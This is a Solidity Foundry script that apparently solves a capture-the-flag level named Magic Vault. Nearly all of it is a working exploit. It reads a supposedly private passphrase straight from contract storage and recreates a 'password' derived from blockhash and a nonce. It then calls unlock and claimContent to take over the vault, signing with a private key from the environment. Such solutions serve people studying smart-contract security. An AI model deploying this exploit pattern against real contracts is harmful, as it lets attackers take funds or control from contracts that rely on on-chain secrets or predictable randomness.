// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/blockchain_magic_vault/Vault.sol";
import "../src/blockchain_magic_vault/Setup.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract Exploiter {
  Vault level;
  bytes32 phrase;
  uint nonce;
  constructor ( Vault level_, bytes32 _pharese ) {
    level = level_;
    phrase = _pharese;
  } 

  function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
        nonce++;
    }

  function _magicPassword() private returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
        uint128 _key2 = uint128(_generateKey(2));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(phrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
  }

  function exploit() public {
    uint64 _secretKey = uint64(_magicPassword()); 
    uint128 ownerUint = (uint128(uint64(uint160(level.owner()))) << 64) + _secretKey;
    //require (uint64(_secretKey) == ownerUint, "SecretKey e OwnerAddress Are different");
    //uint128 passwordInt = (1 << 127) ;
    level.unlock(bytes16(ownerUint));
  } 
} 


contract MagicVaultSolution is Script {
  Vault public level = Vault(payable(0xfc8341D64529308fa43B19C89dF9C6d3773d153d));
  Setup public level_setup = Setup(payable(0x6484Ab7622B58A0f5d83E8f67C3f9d9Cb537bC5f));

  function run() external { 
    vm.startBroadcast(vm.envUint("PRIVATE_KEY_MAGIC_VAULT"));
    console.log("Map Holder Address: ", level.mapHolder());
    uint slot = 2;
    bytes32 passphrase = vm.load(address(level), bytes32(slot));
    Exploiter exploit = new Exploiter(level, passphrase);
    console.logBytes32(passphrase);
    exploit.exploit();
    level.claimContent();
    console.log("New Map Holder Address: ", level.mapHolder());
  }
} 
